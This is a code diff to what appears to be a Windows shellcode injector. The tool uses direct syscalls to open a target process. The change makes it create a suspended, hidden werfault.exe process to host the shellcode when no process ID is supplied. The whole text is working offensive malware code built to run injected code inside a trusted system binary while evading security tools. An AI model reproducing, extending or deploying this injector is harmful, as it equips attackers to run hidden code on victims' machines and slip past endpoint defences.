@@ -268,25 +268,34 @@ int main(int argc, char* argv[])
 	SIZE_T szAllocation = sizeof shellcode;
 	DWORD oldProtect;
 
-	//DWORD targetPid = 14948;
+	STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    LPCWSTR cmd;
+    DWORD procId;
 
+    ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
 	
 	if (argc < 2)
 	{
-		printf("Enter target PID");
-		return 1;
+		cmd = (LPCWSTR)"C:\\Windows\\System32\\werfault.exe";
+	    printf("Creating suspended werfault.exe process...\n");
+	    if (!CreateProcess((LPCSTR)cmd, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+	        exit(1);
+	    }
 
-	} 
-
-	DWORD targetPid = std::atoi(argv[1]);
+    	procId = pi.dwProcessId;
+    }
+    else {
+    	procId = std::atoi(argv[1]);
+    }
 
 	if (!EstablishSyscalls())
 		return 1;
 
-
-
-	printf("Opening target process with PID %d\n", targetPid);
-	hProc = CallOpenProc(targetPid);
+	printf("Opening target process with PID %d\n", procId);
+	hProc = CallOpenProc(procId);
 	if (hProc == INVALID_HANDLE_VALUE) {
 		printf("Failed to open target process\n");
 		return FALSE;
